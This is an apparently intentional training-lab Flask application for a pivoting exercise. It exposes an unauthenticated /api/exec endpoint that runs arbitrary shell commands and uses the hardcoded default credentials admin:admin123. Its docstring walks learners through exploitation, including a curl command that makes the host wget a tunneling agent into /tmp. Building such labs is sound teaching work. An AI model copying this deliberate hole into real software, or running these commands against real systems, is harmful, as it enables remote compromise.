#!/usr/bin/env python3
"""
Internal Server Admin Dashboard — intentionally vulnerable web application.

Vulnerability: Exposed debug API endpoint with command execution
The /api/exec endpoint was "left enabled in production" and allows
unauthenticated command execution via POST request.

The main dashboard requires login (admin:admin123) but the API
endpoint has no auth check — a realistic oversight.

Discovery path for learners:
  1. Find the service on port 8080 via nmap through the tunnel
  2. See the login page, try default creds or enumerate
  3. Notice /api/health is unauthenticated (returns JSON)
  4. Fuzz/guess /api/exec or find it referenced in page source
  5. Use it to download and run tunneling agents

Examples:
  curl http://10.10.2.30:8080/api/health
  curl -X POST http://10.10.2.30:8080/api/exec -d 'cmd=id'
  curl -X POST http://10.10.2.30:8080/api/exec -d 'cmd=wget http://10.10.2.20:9001/ligolo-agent -O /tmp/agent'
"""

from flask import Flask, request, jsonify, session, redirect, url_for
import os
import subprocess
import socket
import datetime

app = Flask(__name__)
app.secret_key = 'super-secret-internal-key-12345'

# ──────────────────────────────────────────────
# Dashboard credentials (default/weak)
# ──────────────────────────────────────────────
ADMIN_USER = "admin"
ADMIN_PASS = "admin123"

# ──────────────────────────────────────────────
# HTML Templates
# ──────────────────────────────────────────────
LOGIN_PAGE = """<!DOCTYPE html>
<html>
<head>
    <title>SrvAdmin — Internal Server Administration</title>
    <style>
        body {{
            font-family: 'Segoe UI', Arial, sans-serif;
            background: #0d1117;
            color: #c9d1d9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }}
        .login-box {{
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 6px;
            padding: 40px;
            width: 320px;
        }}
        h2 {{ color: #58a6ff; margin-top: 0; }}
        input {{
            width: 100%;
            padding: 8px;
            margin: 8px 0;
            background: #0d1117;
            border: 1px solid #30363d;
            color: #c9d1d9;
            border-radius: 4px;
            box-sizing: border-box;
        }}
        button {{
            width: 100%;
            padding: 10px;
            background: #238636;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            margin-top: 10px;
        }}
        button:hover {{ background: #2ea043; }}
        .error {{ color: #f85149; font-size: 0.9em; }}
        .footer {{ color: #484f58; font-size: 0.75em; margin-top: 20px; text-align: center; }}
    </style>
</head>
<body>
    <div class="login-box">
        <h2>SrvAdmin</h2>
        <p>Internal Server Administration Panel</p>
        {error}
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="Username" />
            <input type="password" name="password" placeholder="Password" />
            <button type="submit">Sign In</button>
        </form>
        <div class="footer">
            SrvAdmin v3.1.4 — Internal use only<br>
            <!-- API docs: /api/health, /api/exec (debug) -->
        </div>
    </div>
</body>
</html>
"""

DASHBOARD_PAGE = """<!DOCTYPE html>
<html>
<head>
    <title>SrvAdmin — Dashboard</title>
    <style>
        body {{
            font-family: 'Segoe UI', Arial, sans-serif;
            background: #0d1117;
            color: #c9d1d9;
            max-width: 800px;
            margin: 30px auto;
            padding: 20px;
        }}
        h1 {{ color: #58a6ff; }}
        .card {{
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 6px;
            padding: 20px;
            margin: 15px 0;
        }}
        .card h3 {{ color: #58a6ff; margin-top: 0; }}
        .stat {{ color: #238636; font-size: 1.2em; }}
        table {{ width: 100%; border-collapse: collapse; }}
        td {{ padding: 6px 10px; border-bottom: 1px solid #21262d; }}
        td:first-child {{ color: #8b949e; width: 40%; }}
        a {{ color: #f85149; }}
        .topbar {{
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #30363d;
            padding-bottom: 10px;
            margin-bottom: 20px;
        }}
        .footer {{ color: #484f58; font-size: 0.75em; margin-top: 30px; }}
    </style>
</head>
<body>
    <div class="topbar">
        <h1>SrvAdmin Dashboard</h1>
        <a href="/logout">Sign Out</a>
    </div>

    <div class="card">
        <h3>Server Information</h3>
        <table>
            <tr><td>Hostname</td><td>{hostname}</td></tr>
            <tr><td>Time</td><td>{time}</td></tr>
            <tr><td>Interfaces</td><td><pre>{interfaces}</pre></td></tr>
        </table>
    </div>

    <div class="card">
        <h3>Service Status</h3>
        <table>
            <tr><td>Web Dashboard</td><td class="stat">● Running (port 8080)</td></tr>
            <tr><td>SSH</td><td style="color:#f85149">● Not installed</td></tr>
        </table>
    </div>

    <div class="footer">
        SrvAdmin v3.1.4 — pivot2.internal.lab
    </div>
</body>
</html>
"""

# ──────────────────────────────────────────────
# Routes — Authenticated dashboard
# ──────────────────────────────────────────────
@app.route('/')
def index():
    if session.get('authenticated'):
        return redirect(url_for('dashboard'))
    return LOGIN_PAGE.format(error="")

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    if username == ADMIN_USER and password == ADMIN_PASS:
        session['authenticated'] = True
        return redirect(url_for('dashboard'))
    return LOGIN_PAGE.format(error='<p class="error">Invalid credentials.</p>')

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))

@app.route('/dashboard')
def dashboard():
    if not session.get('authenticated'):
        return redirect(url_for('index'))

    hostname = socket.gethostname()
    time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    try:
        interfaces = subprocess.check_output(['ip', 'addr'], text=True)
    except Exception:
        interfaces = "unavailable"

    return DASHBOARD_PAGE.format(
        hostname=hostname,
        time=time,
        interfaces=interfaces
    )

# ──────────────────────────────────────────────
# Routes — API endpoints (the vulnerability)
#
# /api/health — unauthenticated, benign (hints that API exists)
# /api/exec   — unauthenticated RCE (the "debug endpoint left in prod")
# ──────────────────────────────────────────────
@app.route('/api/health')
def api_health():
    return jsonify({
        "status": "ok",
        "hostname": socket.gethostname(),
        "version": "3.1.4",
        "endpoints": ["health", "exec"],
        "uptime": os.popen("uptime -p").read().strip()
    })

@app.route('/api/exec', methods=['GET', 'POST'])
def api_exec():
    """
    Debug endpoint — NO AUTHENTICATION CHECK.
    Accepts 'cmd' parameter via GET query string or POST form data.
    """
    cmd = request.args.get('cmd') or request.form.get('cmd')

    if not cmd:
        return jsonify({
            "error": "missing 'cmd' parameter",
            "usage": "POST /api/exec with cmd=<command> or GET /api/exec?cmd=<command>"
        }), 400

    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=10
        )
        return jsonify({
            "command": cmd,
            "stdout": result.stdout,
            "stderr": result.stderr,
            "returncode": result.returncode
        })
    except subprocess.TimeoutExpired:
        return jsonify({"error": "command timed out"}), 504
    except Exception as e:
        return jsonify({"error": str(e)}), 500


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
